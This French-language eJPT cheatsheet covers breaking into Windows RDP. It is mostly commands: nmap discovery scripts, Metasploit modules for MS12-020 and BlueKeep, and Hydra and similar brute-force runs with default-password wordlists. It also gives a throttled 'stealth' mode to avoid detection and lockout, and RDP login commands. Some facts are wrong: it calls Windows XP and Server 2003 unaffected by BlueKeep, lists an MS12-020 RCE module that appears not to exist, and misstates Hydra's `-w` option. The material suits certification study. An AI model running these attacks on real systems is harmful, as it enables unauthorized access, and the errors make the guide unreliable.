# 🖥️ RDP Enumeration & Exploitation - Cheatsheet eJPT

## 🔍 1. Scripts Nmap pour RDP

### Scripts de découverte RDP (Port 3389)
| Script | Description | Usage |
|--------|-------------|-------|
| `rdp-enum-encryption` | Énumération chiffrement RDP | `nmap --script rdp-enum-encryption target` |
| `rdp-ntlm-info` | Informations NTLM via RDP | `nmap --script rdp-ntlm-info target` |
| `rdp-vuln-ms12-020` | CVE-2012-0002 DoS | `nmap --script rdp-vuln-ms12-020 target` |

### Commandes Nmap RDP détaillées
```bash
# Scan complet RDP
nmap -p3389 --script rdp-* target

# Énumération de base
nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info target

# Test vulnérabilités
nmap -p3389 --script rdp-vuln-* target

# Détection OS via RDP
nmap -p3389 --script rdp-ntlm-info target | grep "Target_Name\|NetBIOS_Domain_Name"
```

---

## 🛠️ 2. Modules Metasploit pour RDP

### Modules de scanning/énumération
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/rdp/rdp_scanner` | Scanner RDP basique | `use auxiliary/scanner/rdp/rdp_scanner` |
| `auxiliary/scanner/rdp/ms12_020_check` | Check CVE-2012-0002 | `use auxiliary/scanner/rdp/ms12_020_check` |
| `auxiliary/admin/rdp/rdp_multiuser_login` | Test multi-utilisateurs | `use auxiliary/admin/rdp/rdp_multiuser_login` |

### Modules d'exploitation
| Module | CVE | Description |
|--------|-----|-------------|
| `exploit/windows/rdp/ms12_020_netapi` | CVE-2012-0002 | RDP Remote Code Execution |
| `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` | CVE-2012-0002 | RDP DoS Attack |

### Modules de brute force
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/rdp/rdp_scanner` | Scanner avec auth | Brute force intégré |
| `auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce` | BlueKeep scanner | `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce` |

---

## 🔧 3. Workflow Metasploit pour RDP

### Configuration de base
```bash
msfconsole -q
workspace -a rdp_enum
setg RHOSTS target_ip
```

### Séquence d'énumération RDP
```bash
# 1. Scanner basique
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target
run

# 2. Check CVE-2012-0002
use auxiliary/scanner/rdp/ms12_020_check
set RHOSTS target
run

# 3. Check BlueKeep (Windows 7/2008)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
run

# 4. Si versions vulnérables détectées
use exploit/windows/rdp/ms12_020_netapi
set RHOSTS target
set LHOST attacker_ip
exploit
```

---

## 💀 4. Brute Force RDP avec Hydra

### Syntaxe Hydra pour RDP
```bash
hydra [OPTIONS] rdp://target
```

### Options spécifiques RDP
| Option | Description | Exemple |
|--------|-------------|---------|
| `-l <user>` | Utilisateur unique | `-l administrator` |
| `-L <file>` | Liste d'utilisateurs | `-L users.txt` |
| `-p <pass>` | Mot de passe unique | `-p Password123` |
| `-P <file>` | Liste de mots de passe | `-P passwords.txt` |
| `-t <threads>` | Threads (ATTENTION: max 4 pour RDP) | `-t 4` |
| `-f` | Arrêter après succès | `-f` |
| `-V` | Mode très verbose | `-V` |
| `-s <port>` | Port personnalisé | `-s 3389` |

### Exemples de brute force RDP

#### 1. Brute force utilisateur administrateur
```bash
# Test administrator avec liste de mots de passe
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 4 -f rdp://target

# Avec options avancées
hydra -l administrator -P passwords.txt -t 4 -f -V -o rdp_results.txt rdp://target
```

**⚠️ IMPORTANT :** RDP a des limitations de connexions simultanées. Utiliser **maximum 4 threads** pour éviter de bloquer le service.

#### 2. Brute force liste d'utilisateurs Windows courants
```bash
# Utilisateurs Windows typiques
hydra -L windows_users.txt -P common_passwords.txt -t 4 -f -V rdp://target

# One-liner avec utilisateurs courants
hydra -L <(echo -e "administrator\nadmin\nroot\nguest\nuser") \
      -P <(echo -e "password\nPassword123\nadmin\n123456\npassword123") \
      -t 4 -f rdp://target
```

#### 3. Brute force avec délai (mode furtif)
```bash
# Mode lent pour éviter détection/blocage
hydra -l administrator -P passwords.txt -t 1 -w 5 -f rdp://target

# Mode très furtif
hydra -l administrator -P passwords.txt -t 1 -w 10 -f -V rdp://target
```

**Explication options timing :**
- `-t 1` : 1 seul thread (très important pour RDP)
- `-w 5` : 5 secondes entre tentatives
- `-w 10` : 10 secondes (ultra-furtif)

#### 4. Brute force sur port non-standard
```bash
# RDP sur port personnalisé
hydra -l administrator -P passwords.txt -s 13389 -t 4 rdp://target

# Ou avec syntaxe alternative
hydra -l administrator -P passwords.txt -t 4 rdp://target:13389
```

### Wordlists spécialisées RDP

#### Utilisateurs Windows courants (windows_users.txt)
```bash
cat > windows_users.txt << EOF
administrator
admin
root
guest
user
test
demo
backup
service
operator
support
helpdesk
temp
public
EOF
```

#### Mots de passe Windows courants (windows_passwords.txt)
```bash
cat > windows_passwords.txt << EOF
password
Password123
admin
123456
password123
administrator
Admin123
root
guest
user
qwerty
letmein
welcome
Password1
Admin
Password!
123456789
password1
EOF
```

### Brute force RDP avec wordlists personnalisées
```bash
# Test rapide avec credentials Windows courants
hydra -L windows_users.txt -P windows_passwords.txt -t 4 -f -o rdp_creds.txt rdp://target

# Vérifier résultats
cat rdp_creds.txt

# Test exhaustif (ATTENTION: peut prendre du temps)
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 2 -f -V rdp://target | tee hydra_rdp.log
```

---

## 🔑 5. Connexion RDP après brute force réussi

### Outils de connexion RDP
| Outil | Système | Commande |
|-------|---------|----------|
| **rdesktop** | Linux | `rdesktop -u username -p password target` |
| **xfreerdp** | Linux | `xfreerdp /u:username /p:password /v:target` |
| **remmina** | Linux GUI | Interface graphique |
| **mstsc** | Windows | `mstsc /v:target` |

### Connexions RDP détaillées

#### Avec rdesktop
```bash
# Connexion basique
rdesktop -u administrator -p Password123 target

# Plein écran
rdesktop -u administrator -p password -f target

# Résolution personnalisée
rdesktop -u administrator -p password -g 1024x768 target

# Partage de répertoire local
rdesktop -u administrator -p password -r disk:share=/tmp target
```

#### Avec xfreerdp (moderne, recommandé)
```bash
# Connexion basique
xfreerdp /u:administrator /p:Password123 /v:target

# Avec options avancées
xfreerdp /u:administrator /p:password /v:target /size:1024x768 /cert-ignore

# Partage de répertoire
xfreerdp /u:administrator /p:password /v:target /drive:share,/tmp

# Copier-coller activé
xfreerdp /u:administrator /p:password /v:target +clipboard

# Mode sans certificat (pour labs)
xfreerdp /u:administrator /p:password /v:target /cert-ignore +clipboard
```

### Script automatisé connexion RDP
```bash
#!/bin/bash
TARGET=$1
USER=$2
PASS=$3

echo "[+] Connecting to RDP on $TARGET"
echo "[*] User: $USER"
echo "[*] Pass: $PASS"

# Test de connexion
echo "[*] Testing RDP connectivity..."
nmap -p3389 $TARGET | grep "open"

if [ $? -eq 0 ]; then
    echo "[+] RDP port is open, attempting connection..."
    xfreerdp /u:$USER /p:$PASS /v:$TARGET /cert-ignore +clipboard
else
    echo "[-] RDP port appears closed"
fi
```

---

## 🎯 6. Cas d'usage spécifiques eJPT

### Scénario 1: Découverte et brute force RDP
```bash
# 1. Découverte RDP
nmap -p3389 -sV target

# 2. Énumération détaillée
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption target

# 3. Brute force prudent
hydra -l administrator -P common_passwords.txt -t 2 -w 3 -f rdp://target

# 4. Connexion si succès
xfreerdp /u:administrator /p:foundpassword /v:target /cert-ignore
```

### Scénario 2: Test BlueKeep (Windows 7/2008)
```bash
# 1. Identifier version Windows
nmap -p3389 --script rdp-ntlm-info target

# 2. Test BlueKeep si Windows 7/2008
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
run

# 3. Exploitation si vulnérable
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set LHOST attacker_ip
exploit
```

### Scénario 3: RDP sur port non-standard
```bash
# 1. Scan de ports étendu
nmap -p 3389,13389,33389 -sV target

# 2. Si RDP sur port custom
hydra -l administrator -P passwords.txt -s 13389 -t 4 rdp://target

# 3. Connexion sur port custom
xfreerdp /u:administrator /p:password /v:target:13389 /cert-ignore
```

---

## 🚨 7. Vulnérabilités RDP communes

### CVE-2012-0002 (MS12-020)
```bash
# Détection
nmap --script rdp-vuln-ms12-020 -p3389 target

# Exploitation (DoS)
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOSTS target
run

# Exploitation (RCE - rare)
use exploit/windows/rdp/ms12_020_netapi
set RHOSTS target
set LHOST attacker_ip
exploit
```

### CVE-2019-0708 (BlueKeep)
```bash
# Détection (Windows 7/2008 vulnérables)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
run

# Exploitation (ATTENTION: peut crasher)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set LHOST attacker_ip
exploit
```

### Versions Windows vulnérables
| Version | CVE-2012-0002 | CVE-2019-0708 (BlueKeep) |
|---------|---------------|--------------------------|
| **Windows XP** | ✅ Vulnérable | ❌ Non affecté |
| **Windows Server 2003** | ✅ Vulnérable | ❌ Non affecté |
| **Windows Vista** | ✅ Vulnérable | ❌ Non affecté |
| **Windows 7** | ✅ Vulnérable | ✅ Vulnérable |
| **Windows Server 2008** | ✅ Vulnérable | ✅ Vulnérable |
| **Windows 8+** | ❌ Patché | ❌ Non affecté |

---

## 🔧 8. Outils complémentaires RDP

### rdesktop options avancées
```bash
# Options de sécurité
rdesktop -u user -p pass -x lan target          # Optimisation LAN
rdesktop -u user -p pass -a 16 target           # Couleurs 16 bits
rdesktop -u user -p pass -z target              # Compression

# Redirection de ressources
rdesktop -u user -p pass -r sound:local target  # Son local
rdesktop -u user -p pass -r disk:local=/tmp target # Partage disque
```

### Alternatives à Hydra pour RDP
```bash
# Ncrack (alternative à Hydra)
ncrack -vv --user administrator -P passwords.txt rdp://target

# Medusa
medusa -h target -u administrator -P passwords.txt -M rdp

# Crowbar (spécialisé RDP)
crowbar -b rdp -s target/32 -u administrator -C passwords.txt
```

---

## 💡 9. Conseils et bonnes pratiques eJPT

### Limitations importantes RDP
- **Connexions simultanées limitées** : Max 2-3 pour Windows non-server
- **Tentatives de brute force** : Risque de lockout account
- **Détection facile** : Logs Windows Event très verbeux
- **Threads Hydra** : JAMAIS plus de 4 threads

### Workflow RDP recommandé
1. **Scan de découverte** : `nmap -p3389 -sV target`
2. **Énumération info** : `nmap --script rdp-ntlm-info target`
3. **Test vulnérabilités** : BlueKeep, MS12-020
4. **Brute force prudent** : Hydra avec `-t 2 -w 5`
5. **Connexion** : xfreerdp si credentials trouvés

### Erreurs courantes à éviter
- **Trop de threads** : Cause blocage RDP service
- **Pas de délai** : Déclenche détection/lockout
- **Ignorer les versions** : Manquer exploits directs
- **Pas de test manuel** : admin:admin, guest:guest courants

### Détection et logs RDP
```bash
# RDP génère beaucoup de logs Windows
# Event ID 4624 : Connexion réussie
# Event ID 4625 : Connexion échouée
# Event ID 4634 : Déconnexion

# Être discret avec RDP
hydra -l administrator -P short_passwords.txt -t 1 -w 10 -f rdp://target
```

### One-liners RDP utiles
```bash
# Test rapide credentials courants
hydra -L <(echo -e "administrator\nadmin\nguest") -P <(echo -e "password\nPassword123\nadmin") -t 2 -f rdp://target

# Scan + brute force en une fois
nmap -p3389 target && hydra -l administrator -p password -t 1 rdp://target

# Test BlueKeep rapide
nmap --script rdp-vuln* target | grep -i "vulnerable\|VULNERABLE"
```

**🎯 Conseil final eJPT :** RDP dans l'eJPT suit souvent ce pattern : découverte → test credentials faibles (admin:password, administrator:Password123) → si échec, brute force prudent → connexion. BlueKeep est rare mais dévastateur si présent !